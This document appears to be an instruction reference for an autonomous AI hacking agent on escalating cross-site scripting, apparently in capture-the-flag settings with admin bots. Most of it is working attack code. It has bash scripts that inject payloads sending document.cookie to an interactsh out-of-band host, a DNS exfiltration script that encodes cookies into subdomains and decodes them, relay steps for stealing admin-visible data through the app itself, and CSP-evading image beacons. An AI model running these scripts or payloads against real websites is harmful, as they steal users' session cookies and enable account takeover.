# OOB Escalation Reference

## Phase 6 — Escalation Script

Write a single shell script and run it in ONE tool call. Substitute real values for all
`TARGET`, `INJECT_URL`, `PARAM`, `METHOD`, `REPORT_URL` placeholders.

```bash
cat > /tmp/aurelinth/xss_oob.sh << 'EOF'
#!/bin/bash
# Args: TARGET INJECT_URL PARAM METHOD REPORT_URL
# INJECT_URL = where to submit the XSS payload (may differ from TARGET)
# REPORT_URL = admin bot trigger endpoint (POST url=... to here)
TARGET="$1"
INJECT_URL="${2:-$1}"
PARAM="${3:-q}"
METHOD="${4:-GET}"
REPORT_URL="${5:-}"

rm -f /tmp/aurelinth/interact_url.txt /tmp/aurelinth/interact_out.jsonl

# Start interactsh-client in background
interactsh-client -n 1 -json -ps \
  -psf /tmp/aurelinth/interact_url.txt \
  -o /tmp/aurelinth/interact_out.jsonl 2>/dev/null &
IPID=$!

for i in $(seq 1 10); do
  [[ -s /tmp/aurelinth/interact_url.txt ]] && break
  sleep 1
done

OOB_URL=$(cat /tmp/aurelinth/interact_url.txt 2>/dev/null)
if [[ -z "$OOB_URL" ]]; then
  echo "ERROR: interactsh-client failed to start"
  kill $IPID 2>/dev/null
  exit 1
fi
echo "OOB_URL: $OOB_URL"

enc() { python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$1"; }

# Try HTTP OOB payloads
for PAYLOAD in \
  "<script>fetch('http://$OOB_URL/?c='+document.cookie)</script>" \
  "<img src=x onerror=\"fetch('http://$OOB_URL/?c='+document.cookie)\">" \
  "<svg onload=\"fetch('http://$OOB_URL/?c='+document.cookie)\">" \
  "<script>new Image().src='http://$OOB_URL/?c='+encodeURIComponent(document.cookie)</script>"
do
  if [[ "$METHOD" == "POST" ]]; then
    curl -s -X POST -d "$PARAM=$(enc "$PAYLOAD")" "$INJECT_URL" -o /dev/null
  else
    curl -s "$INJECT_URL?$PARAM=$(enc "$PAYLOAD")" -o /dev/null
  fi
  # Trigger admin bot if report endpoint known
  [[ -n "$REPORT_URL" ]] && curl -s -X POST "$REPORT_URL" \
    -d "url=$(enc "$INJECT_URL?$PARAM=$(enc "$PAYLOAD")")" -o /dev/null 2>/dev/null
  sleep 1
done

echo "Waiting 45s for admin bot HTTP callback..."
sleep 45
kill $IPID 2>/dev/null

echo "=== OOB HTTP Interactions ==="
if [[ -s /tmp/aurelinth/interact_out.jsonl ]]; then
  cat /tmp/aurelinth/interact_out.jsonl
  echo "OOB_STATUS: RECEIVED"
else
  echo "OOB_STATUS: EMPTY — no HTTP callbacks. Bot sandbox likely blocks external HTTP."
fi
EOF
chmod +x /tmp/aurelinth/xss_oob.sh
bash /tmp/aurelinth/xss_oob.sh "TARGET_URL" "INJECT_URL" "param_name" "GET" "REPORT_URL"
```

**After the script:**
- `OOB_STATUS: RECEIVED` → parse cookie/flag from the interaction, proceed to flag extraction
- `OOB_STATUS: EMPTY` → bot sandbox blocks HTTP. Do NOT report a flag. Go to Sandboxed Bot Fallback below.

### Stored XSS — Finding the display URL

The injection URL (where you POST the payload) and the display URL (where stored content renders)
are **different**. The admin bot needs the **display URL**.

**Step — Find the display URL before running OOB (1 tool call):**
```bash
# After creating your item, parse the listing page for links to YOUR specific stored item
curl -s -b /tmp/aurelinth/cookies.txt "LISTING_PAGE_FROM_RECON" | grep -oP 'href="[^"]+"' | head -20
```

If no per-item link on listing page, check:
- `Location:` redirect header of your POST create-item response
- View-source of the listing page for hidden identifiers in data attributes or JS state

**Privacy check:** If stored items are private to each user (the bot sees its own items, not yours),
go directly to Phase 7b (in-app relay).

---

## Sandboxed Bot Fallback

Only enter when Phase 6 returned `OOB_STATUS: EMPTY`. Try in order: 7a → 7b → 7c → 7d.

### 7a — DNS exfil

Run in ONE tool call:
```bash
cat > /tmp/aurelinth/xss_dns.sh << 'EOF'
#!/bin/bash
INJECT_URL="$1"; PARAM="$2"; METHOD="${3:-GET}"; REPORT_URL="${4:-}"

rm -f /tmp/aurelinth/interact_url_dns.txt /tmp/aurelinth/interact_out_dns.jsonl
interactsh-client -n 1 -json -ps \
  -psf /tmp/aurelinth/interact_url_dns.txt \
  -o /tmp/aurelinth/interact_out_dns.jsonl 2>/dev/null &
IPID=$!
for i in $(seq 1 10); do [[ -s /tmp/aurelinth/interact_url_dns.txt ]] && break; sleep 1; done
OOB=$(cat /tmp/aurelinth/interact_url_dns.txt 2>/dev/null)
[[ -z "$OOB" ]] && { echo "ERROR: no OOB URL"; exit 1; }
echo "DNS OOB_URL: $OOB"

enc() { python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$1"; }

# DNS exfil: embed data in subdomain label (max 63 chars per label)
DNS_PAYLOAD="<script>var d=btoa(document.cookie).replace(/[^a-zA-Z0-9]/g,'').slice(0,50);new Image().src='http://'+d+'.$OOB/'</script>"

if [[ "$METHOD" == "POST" ]]; then
  curl -s -X POST -d "$PARAM=$(enc "$DNS_PAYLOAD")" "$INJECT_URL" -o /dev/null
else
  curl -s "$INJECT_URL?$PARAM=$(enc "$DNS_PAYLOAD")" -o /dev/null
fi
[[ -n "$REPORT_URL" ]] && curl -s -X POST "$REPORT_URL" \
  -d "url=$(enc "$INJECT_URL?$PARAM=$(enc "$DNS_PAYLOAD")")" -o /dev/null 2>/dev/null

echo "Waiting 45s for DNS callback..."
sleep 45
kill $IPID 2>/dev/null

echo "=== DNS OOB Interactions ==="
if [[ -s /tmp/aurelinth/interact_out_dns.jsonl ]]; then
  cat /tmp/aurelinth/interact_out_dns.jsonl
  python3 -c "
import json, base64
for line in open('/tmp/aurelinth/interact_out_dns.jsonl'):
    try:
        d = json.loads(line)
        host = d.get('full-id','')
        label = host.split('.')[0]
        pad = label + '=' * (-len(label) % 4)
        print('Decoded:', base64.b64decode(pad).decode(errors='replace'))
    except: pass
" 2>/dev/null
  echo "DNS_STATUS: RECEIVED"
else
  echo "DNS_STATUS: EMPTY — DNS also blocked."
fi
EOF
chmod +x /tmp/aurelinth/xss_dns.sh
bash /tmp/aurelinth/xss_dns.sh "INJECT_URL" "param_name" "GET" "REPORT_URL"
```

### 7b — In-app relay

When OOB is blocked, the app itself becomes the exfil channel. XSS executes in the admin's
browser with the admin's session — it can POST to any same-origin endpoint.

**From recon context, identify:**
- A **writable endpoint**: something the XSS payload can POST to (admin cookies sent automatically)
- A **readable endpoint**: something you can read back as the attacker

**Decision logic — pick the first option that exists:**
1. Public user-writable field (display name, bio, about, avatar URL) → attacker reads without auth
2. Any comment/post/note storage you can create and read back as the attacker
3. Private profile field → craft XSS to write into the attacker's own account, not admin's

**Steps:**
1. Identify the writable storage endpoint (method, path, body field name) and the read endpoint
2. Craft XSS: fetch what admin can see (flag endpoint, admin page) → POST into relay field
3. Submit payload and trigger admin bot the same way as Phase 6
4. `sleep 45` then read the relay field back as the attacker

### 7c — Double-bot relay

Some apps fetch the reported URL server-side before showing it to the admin:
```bash
curl -s -X POST "REPORT_URL" \
  -d "url=http://OOB_URL/?server_test=1" \
  -d "message=test"
sleep 10
echo "Server-side fetch check:"
cat /tmp/aurelinth/interact_out.jsonl 2>/dev/null | grep -i "server_test"
```

### 7d — CSP-aware exfil

Read the CSP from Phase 3 and adapt:
- `img-src` allows external but `connect-src` doesn't → use image beacon instead of `fetch`
- All external origins blocked → go to 7b (in-app relay is inherently same-origin)
- `connect-src 'self'` → 7b payloads work without modification

```js
// Image beacon (use when img-src is less restricted than connect-src)
new Image().src = 'http://OOB_URL/?c=' + encodeURIComponent(document.cookie);
```
